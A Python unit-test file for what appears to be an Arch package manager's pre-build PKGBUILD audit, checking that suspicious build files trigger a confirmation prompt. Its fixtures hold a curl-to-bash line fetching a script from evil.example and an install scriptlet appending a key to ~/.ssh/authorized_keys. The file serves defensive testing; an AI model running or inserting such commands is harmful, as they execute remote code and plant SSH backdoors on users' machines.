import os
import tempfile
import unittest
from unittest.mock import Mock

from atlas.gems.arch.controller import ArchManager


CLEAN = """\
pkgname=foo
build() { cd "$srcdir"; make; }
package() { make DESTDIR="$pkgdir" install; }
"""

NASTY = """\
pkgname=evil
build() {
  curl -sL https://evil.example/p.sh | bash
}
"""


class AuditGateTest(unittest.TestCase):
    """ArchManager._audit_pkgbuild: advisory pre-build PKGBUILD scan."""

    def setUp(self):
        self.mgr = ArchManager.__new__(ArchManager)  # skip heavy __init__
        self.mgr.logger = Mock()
        self.tmp = tempfile.mkdtemp()

    def _ctx(self, audit_enabled=True, confirm=True):
        ctx = Mock()
        ctx.config = {'aur_check_pkgbuild': audit_enabled}
        ctx.name = 'foo'
        ctx.project_dir = self.tmp
        ctx.watcher = Mock()
        ctx.watcher.request_confirmation.return_value = confirm
        return ctx

    def _write_pkgbuild(self, text):
        with open(os.path.join(self.tmp, 'PKGBUILD'), 'w') as f:
            f.write(text)

    def test_clean_pkgbuild_proceeds_without_prompting(self):
        self._write_pkgbuild(CLEAN)
        ctx = self._ctx()
        self.assertTrue(self.mgr._audit_pkgbuild(ctx))
        ctx.watcher.request_confirmation.assert_not_called()

    def test_flagged_pkgbuild_prompts_and_proceeds_on_confirm(self):
        self._write_pkgbuild(NASTY)
        ctx = self._ctx(confirm=True)
        self.assertTrue(self.mgr._audit_pkgbuild(ctx))
        ctx.watcher.request_confirmation.assert_called_once()

    def test_flagged_pkgbuild_aborts_on_cancel(self):
        self._write_pkgbuild(NASTY)
        ctx = self._ctx(confirm=False)
        self.assertFalse(self.mgr._audit_pkgbuild(ctx))
        ctx.watcher.request_confirmation.assert_called_once()

    def test_disabled_by_config_never_scans_or_prompts(self):
        self._write_pkgbuild(NASTY)
        ctx = self._ctx(audit_enabled=False)
        self.assertTrue(self.mgr._audit_pkgbuild(ctx))
        ctx.watcher.request_confirmation.assert_not_called()

    def test_install_scriptlet_is_also_scanned(self):
        self._write_pkgbuild(CLEAN)  # clean PKGBUILD ...
        with open(os.path.join(self.tmp, 'foo.install'), 'w') as f:
            f.write('post_install() { echo "$K" >> ~/.ssh/authorized_keys; }\n')  # ... nasty .install
        ctx = self._ctx(confirm=True)
        self.assertTrue(self.mgr._audit_pkgbuild(ctx))
        ctx.watcher.request_confirmation.assert_called_once()

    def test_missing_pkgbuild_does_not_block(self):
        ctx = self._ctx()  # no PKGBUILD written
        self.assertTrue(self.mgr._audit_pkgbuild(ctx))
        ctx.watcher.request_confirmation.assert_not_called()


if __name__ == '__main__':
    unittest.main()
